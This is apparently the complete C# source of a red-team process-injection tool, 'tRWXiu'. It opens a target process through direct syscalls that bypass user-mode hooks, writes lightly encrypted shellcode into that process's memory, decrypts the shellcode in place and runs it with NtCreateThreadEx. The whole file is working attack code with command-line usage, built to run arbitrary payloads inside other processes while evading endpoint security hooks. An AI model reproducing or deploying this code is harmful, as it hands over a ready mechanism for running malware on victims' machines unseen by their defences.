using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using static tRWXiu.Utils.Syscalls;

// trovent RWX injector unhooked 

namespace tRWXiu
{
    internal class Program
    {
        internal static byte[] convert(String data)
        {
            string[] data_spl = data.Split(',');
            byte[] shellcode = new byte[data_spl.Length];
            int byter = 0;
            for (int i = 0; i < shellcode.Length; i++)
            {
                byter = (int)new System.ComponentModel.Int32Converter().ConvertFromString(data_spl[i]);
                shellcode[i] = Convert.ToByte(byter);
            }
            return shellcode;
        }

        internal static Dictionary<string, string> parse(string[] args)
        {
            Dictionary<string, string> res = new Dictionary<string, string>();
            foreach (var arg in args)
            {
                string[] split = arg.Split('=');
                var r = split[0].Replace("/", string.Empty);
                if (split.Length == 1)
                {
                    res[r] = "true";
                }
                if (split.Length == 2)
                {
                    res[r] = split[1];
                }
            }
            return res;
        }

        internal static void usage()
        {
            Console.WriteLine("Usage:\n\ttRWXiu.exe /pid=<pid> /address=<address> /data=<data> [/verbose]");
        }

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void Main(string[] args)
        {
            Dictionary<string, string> parameters = parse(args);
            if (!parameters.ContainsKey("pid") && !parameters.ContainsKey("address") && !parameters.ContainsKey("data"))
            {
                usage();
            }
            //NtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId)
            CLIENT_ID ClientId = new CLIENT_ID();
            ClientId.UniqueProcess = new IntPtr(Convert.ToInt32(parameters["pid"]));
            Console.WriteLine("PID: " + ClientId.UniqueProcess);
            OBJECT_ATTRIBUTES ObjectAttributes = new OBJECT_ATTRIBUTES();
            uint AccessMask = 0x000F000 | 0x00100000 | 0x0000FFFF; //PROCESS_ALL_ACCESS
            IntPtr ProcessHandle = IntPtr.Zero;
            var status = NtOpenProcess(ref ProcessHandle, AccessMask, ref ObjectAttributes, ref ClientId);
            if (status == 0)
            {
                Console.WriteLine("[+] Successfully obtained handle: [{0}]", ProcessHandle);
            }

            //NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] buffer, UInt32 NumberOfBytesToWrite, ref UInt32 NumberOfBytesWritten)
            IntPtr bAddress = new IntPtr(Convert.ToInt64(parameters["address"], 16));
            byte[] buffer = convert(parameters["data"]);
            uint size = (uint)buffer.Length;
            uint written = 0;
            status = NtWriteVirtualMemory(ProcessHandle, bAddress, buffer, size, ref written);
            if (status == 0)
            {
                Console.WriteLine(String.Format("[+] Stage 1 completed. Successfully written [{0}] encrypted bytes", written));
            }

            Console.WriteLine("[*] Decrypting bytes...");
            byte[] buf = new byte[1];
            for (int i = buffer.Length-1; i >= 0; i--)
            {
                byte b = (byte)(((uint)buffer[i] - 5) & 0xFF);
                buf = new byte[] { b };
                NtWriteVirtualMemory(ProcessHandle, bAddress + i, buf, 1, ref written);
                if (((i % 100) == 0))
                {
                    Console.Write(".");
                }
                if (parameters.ContainsKey("verbose"))
                {
                    Console.WriteLine(String.Format("Modified: {1} byte in address: [{0}] with value: {2}", bAddress+i, written, BitConverter.ToString(buf)));
                }
            }
            Console.WriteLine();
            Console.WriteLine(String.Format("[+] Stage 2 completed. Successfully decrypted bytes"));

            //NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, UInt32 NumberOfBytesToRead, ref UInt32 NumberOfBytesRead)
            if (parameters.ContainsKey("verbose"))
            {
                uint read = 0;
                buffer = new byte[size];
                status = NtReadVirtualMemory(ProcessHandle, bAddress, buffer, size, ref read);
                Console.WriteLine("Status: {0}, read: {1}", status, read);
                Console.WriteLine("Buffer hex: " + BitConverter.ToString(buffer));
            }

            Console.WriteLine("[*] Stage 3 in progress...");
            //NtCreateThreadEx(ref IntPtr threadHandle, UInt32 desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool inCreateSuspended, Int32 stackZeroBits, Int32 sizeOfStack, Int32 maximumStackSize, IntPtr attributeList)
            IntPtr tHandle = IntPtr.Zero;
            status = NtCreateThreadEx(ref tHandle, 0x02000000, IntPtr.Zero, ProcessHandle, bAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            if (status == 0)
            {
                Console.WriteLine("[+] Successfully executed code");
            }
        }
    }
}
